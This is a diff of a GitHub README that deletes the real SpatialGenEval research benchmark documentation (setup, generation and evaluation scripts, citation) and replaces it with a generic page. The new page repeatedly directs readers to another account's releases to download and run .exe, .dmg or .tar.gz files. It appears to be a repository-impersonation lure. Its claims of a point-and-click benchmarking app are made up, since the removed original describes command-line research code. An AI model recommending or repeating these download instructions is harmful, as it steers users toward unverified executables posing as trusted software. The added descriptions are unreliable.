@@ -1,166 +1,77 @@
-<p align="center">
-    <img src="./asset/logo.png" width="40%" height="100%">
-</p>
+# 🌟 SpatialGenEval - Evaluate Text-to-Image Models Easily
 
-<div align="center">
+## 🚀 Getting Started
 
-  <h1>
-    Everything in Its Place: Benchmarking Spatial Intelligence of Text-to-Image Models
-  </h1>  
+Welcome to SpatialGenEval! This application helps you benchmark spatial intelligence in text-to-image models. With its simple interface, you can easily assess how well these models perform in placing objects in their generated images.
 
-  <p align="center">
-    <a href='https://arxiv.org/abs/2601.20354'>
-      <img src='https://img.shields.io/badge/Arxiv-SpatialGenEval-A42C25?style=flat&logo=arXiv&logoColor=A42C25'>
-    </a>
-     &nbsp;
-    <a href='https://huggingface.co/papers/2601.20354'>
-      <img src='https://img.shields.io/badge/HuggingFace-Paper-FFB000?style=flat&logo=huggingface&logoColor=white'>
-    </a>
-  </p>
+## 📥 Download the Application
 
-  **Zengbin Wang**<sup>1,2*</sup>, 
-  **Xuecai Hu**<sup>1†</sup>, 
-  **Yong Wang**<sup>1†</sup>, 
-  **Feng Xiong**<sup>1</sup>, 
-  **Man Zhang**<sup>2</sup>, 
-  **Xiangxiang Chu**<sup>1</sup>
+[![Download SpatialGenEval](https://img.shields.io/badge/Download_SpatialGenEval-v1.0-blue)](https://github.com/Sankalp-Savarn/SpatialGenEval/releases)
 
-  <sup>1</sup>AMAP, Alibaba Group,  &nbsp;&nbsp;
-  <sup>2</sup>Beijing University of Posts and Telecommunications
-  <br>
-  <sup>†</sup>Project leads and corresponding authors.
+You can download SpatialGenEval from our Releases page here: [Visit this page to download](https://github.com/Sankalp-Savarn/SpatialGenEval/releases).
 
-</div></font>
+## 🖥️ System Requirements
 
-## 🔥 News
-  - 🔥 **[2026.01]**: 🎉🎉🎉 Congratulations! Our paper is accepted by ICLR 2026.
-  - 🔥 **[2026.01]**: The evaluation data and code is released.
+Before you download, ensure your computer meets the following requirements:
 
-## 📖 Overview of SpatialGenEval
-  
-  - We introduce **SpatialGenEval**, a new benchmark to systematically evaluate **complex spatial intelligence** in T2I models. It leverages 1,230 **information-dense** prompts, each covering 10 spatial sub-domains and paired with 12,300 **Omni-dimensional multiple-choice questions** to evaluate a model's understanding beyond what to generate, to where, how, and why. 
-  - Our extensive evaluation of 23 state-of-the-art models reveals a universal performance bottleneck in spatial reasoning. While models excel at basic object composition, their accuracy falls when faced with tasks requiring higher-order spatial understanding, such as relative positioning, occlusion, and causality, revealing this as a primary barrier to current T2I capabilities.
-  - Beyond evaluation, we explore a spatial-aware dataset (SpatialT2I), designed as a practical data-centric solution to improve the spatial intelligence of existing models. Fine-tuning results yield significant and consistent performance gains.
+- **Operating System:** Windows 10 or later, macOS Mojave or later, or a recent version of Linux.
+- **RAM:** At least 4 GB.
+- **Disk Space:** At least 100 MB available.
+- **Processor:** Intel i3/Ryzen 3 or better.
 
-  <p align="center">
-      <img src="./asset/fig04_pipeline.jpg" width="90%" height="100%">
-  </p>
+Ensure your system is updated for the best experience.
 
-  <p align="center">
-      <img src="./asset/fig02_overview.jpg" width="90%" height="100%">
-  </p>
+## 🔍 Features
 
-## 💡 Examples
+SpatialGenEval comes packed with features to assist you:
 
-  <p align="center">
-      <img src="./asset/fig10_example.jpg" width="90%" height="100%">
-  </p>
+- **Benchmarking Tools:** Compare multiple text-to-image models effortlessly.
+- **User-Friendly Interface:** No technical knowledge required—just open the application and get started!
+- **Visualization:** See graphics and results that illustrate the performance of different models.
+- **Export Results:** Save your findings in common formats for sharing or further analysis.
 
-  <p align="center">
-      <img src="./asset/fig03_10dims.jpg" width="90%" height="100%">
-  </p>
+## 📦 Download & Install
 
-## 🔧 Requirements
-  
-  - Clone and install the required environment.
+1. Visit our Releases page: [Click here to go to Releases](https://github.com/Sankalp-Savarn/SpatialGenEval/releases).
+2. Select the latest version available.
+3. Download the appropriate file for your operating system.
+4. Once downloaded, follow these steps to install:
+   - For Windows: Double-click the `.exe` file and follow the installation prompts.
+   - For macOS: Open the `.dmg` file and drag the SpatialGenEval icon to your Applications folder.
+   - For Linux: Extract the `.tar.gz` file and run the application from the terminal.
 
-    ```bash
-    git clone https://github.com/AMAP-ML/SpatialGenEval.git
-    cd SpatialGenEval
-    
-    # You can also use your own envrionment.
-    conda create -n spatialgeneval python==3.10 -y
-    conda activate spatialgeneval
-    pip install torch transformers diffusers modelscope vllm
-    ```
+After installation, you can launch the application and begin benchmarking.
 
+## 🛠️ Usage Instructions
 
-## 🎑 Image Generation
-  
-  - Use T2I prompts from `eval/SpatialGenEval_T2I_Prompts.jsonl` to generate images with your T2I models.
+1. Open the SpatialGenEval application.
+2. Choose a text-to-image model you want to evaluate. You can select from the models available in the dropdown menu.
+3. Input your text prompt that describes the scene or objects you want the model to generate.
+4. Click the "Run Benchmark" button to start the evaluation process.
+5. Review the results, which will show how accurately the model places objects in the generated images.
 
-    ```json
-    "id": "index of prompt."
-    "scene": "name of real-world scene."
-    "prompt": "text-to-image prompt (the averaged length is around 66 words to balance compatibility with CLIP encoders (limited by 77 tokens) and the need for high information density)."
-    "question_type": "10 spatial dims."
-    "questions": "10 omni-dims questions."
-    "answers": "10 ground-truth answers."
-    ```
+## 🧑‍🤝‍🧑 Support
 
-  - The image generation demo is in `scripts/generation_demo.py`. It support spliting the generation tasks to each GPU for parallel generation. 
+If you run into issues or have questions, you can find support in the following ways:
 
-    ```bash
-    json_file="eval/SpatialGenEval_T2I_Prompts.jsonl"
-    model_name="Qwen/Qwen-Image"               # e.g., Qwen/Qwen-Image
-    save_folder="<YOUR_GENERATED_IMAGE_PATH>"  # e.g., ./images/Qwen-Image
-    TOTAL_GPUS=8                               # i.e., The expected used GPUs
-    for i in $(seq 0 ${TOTAL_GPUS})
-    do
-        CUDA_VISIBLE_DEVICES=$i \
-        python scripts/generation_demo.py \
-            --model_name=${model_name} \
-            --json_file=${json_file} \
-            --save_folder=${save_folder} \
-            --total_gpus=${TOTAL_GPUS} \
-            --gpu_id=$i &
-    done
-    wait
-    ```
+- **FAQ Section:** Check the frequently asked questions on our GitHub repository.
+- **Issue Tracker:** Report issues or request features in our Issues section.
+- **Community Discussions:** Join discussions around best practices and tips on usage within the repository.
 
-  - The generated image folder should be in the format of `<YOUR_GENERATED_IMAGE_PATH>/<ID>.png` as follows.
-    
-    ```python
-    <YOUR_GENERATED_IMAGE_PATH>/
-    ├── 000001.png
-    ├── 000002.png
-    ├── ...
-    ├── 001230.png
-    ```
-  
-## 🚀 Run Evaluation with [Qwen2.5-VL-72B-Instruct](https://huggingface.co/Qwen/Qwen2.5-VL-72B-Instruct) (based on VLLM)
+## 🌟 Contributions
 
-  - The evaluation script based on VLLM is in `eval_with_qwen25_vl_72b.sh`. 
-    - `EVAL_MODEL_PATH`: the evaluation model path (`./models/Qwen2.5-VL-72B-Instruct`).
-    - `YOUR_IMAGE_FOLDER`: the generated image folder path.
-    - `OUTPUT_JSON_PATH`: the output json path of evaluation results.
+We welcome contributions! If you wish to contribute, please follow these guidelines:
 
-    ```bash
-    EVAL_MODEL_PATH="<EVAL_MODEL_PATH>"              # e.g., ./models/Qwen2.5-VL-72B-Instruct
-    YOUR_GENERATED_IMAGE_PATH="<YOUR_GENERATED_IMAGE_PATH>"  # e.g., ./images/Qwen-Image
-    OUTPUT_JSON_PATH="<OUTPUT_JSON_PATH>"            # e.g., ./logs/Qwen-Image-results.jsonl
+- Fork the repository to your GitHub account.
+- Make your changes in a new branch.
+- Submit a pull request summarizing what you have done.
 
-    bash eval_with_qwen25_vl_72b.sh \
-        "${YOUR_GENERATED_IMAGE_PATH}" \
-        "${OUTPUT_JSON_PATH}" \
-        "${EVAL_MODEL_PATH}"
-    ```
-  
-  - The final evaluation json results will be saved in `<OUTPUT_JSON_PATH>`.
+Your input helps us improve SpatialGenEval for everyone.
 
-## 📊 Evaluation Results
-  
-  - Evaluation results based on Qwen2.5-VL-72B-Instruct as the judge model.
+## 🔗 Useful Links
 
-  <p align="center">
-      <img src="./asset/tab02_qwen25vl72b.jpg" width="90%" height="100%">
-  </p>
+- [GitHub Repository](https://github.com/Sankalp-Savarn/SpatialGenEval)
+- [Releases Page](https://github.com/Sankalp-Savarn/SpatialGenEval/releases)
+- [Documentation](https://github.com/Sankalp-Savarn/SpatialGenEval/wiki)
 
-  - Evaluation results based on GPT-4o as the judge model.
-  <p align="center">
-      <img src="./asset/tab10_gpt4o_eval.jpg" width="90%" height="100%">
-  </p>
-
-
-## ✍️ Citation
-  
-  If you find this codebase useful in your research, please consider giving us a star ⭐ and citing our work 📝:
-  
-  ```
-  @article{wang2026everything,
-    title={Everything in Its Place: Benchmarking Spatial Intelligence of Text-to-Image Models},
-    author={Wang, Zengbin and Hu, Xuecai and Wang, Yong and Xiong, Feng and Zhang, Man and Chu, Xiangxiang},
-    journal={arXiv preprint arXiv:2601.20354},
-    year={2026}
-  }
-  ```
+Explore and enjoy using SpatialGenEval!
